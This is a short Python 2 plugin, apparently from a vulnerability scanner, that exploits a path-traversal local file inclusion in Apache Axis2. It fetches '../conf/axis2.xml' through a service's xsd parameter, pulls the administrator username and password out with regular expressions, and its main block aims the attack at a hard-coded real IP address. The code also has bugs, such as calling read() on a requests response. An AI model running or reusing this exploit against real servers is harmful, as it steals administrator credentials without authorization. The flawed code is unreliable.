#!/usr/bin/env python
# encoding: utf-8
from ..t import T
import re
import urllib2,requests,urllib2,json,urlparse




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        payload=target_url+'/axis2/services/listServices'
        result = {}
        result['result']=False
        r=None
        res=None
        try:
            r=requests.get(url=payload,timeout=timeout)
            res_code = r.status_code
            res_html = r.text
            if res_code != 404:
                m=re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>',res_html)
                if m.group(1):
                    server_str = m.group(1)
                    read_url = target_url+'/axis2/services/%s?xsd=../conf/axis2.xml'%(server_str)
                    res = requests.get(read_url,timeout=timeout)
                    res_html = res.read()
                    if 'axisconfig' in res_html:
                        info=''
                        try:
                            user=re.search('<parameter name="userName">(.*?)<\/parameter>',res_html)
                            password=re.search('<parameter name="password">(.*?)<\/parameter>',res_html)
                            info = '%s Local File Inclusion Vulnerability %s:%s'%(read_url,user.group(1),password.group(1))
                        except:
                            pass
                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='Local File Inclusion Vulnerability'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=payload
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            if res is not None:
                res.close()
                del res
            return result
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            

if __name__ == '__main__':
    print P().verify(ip='222.29.81.19',port='8080')          
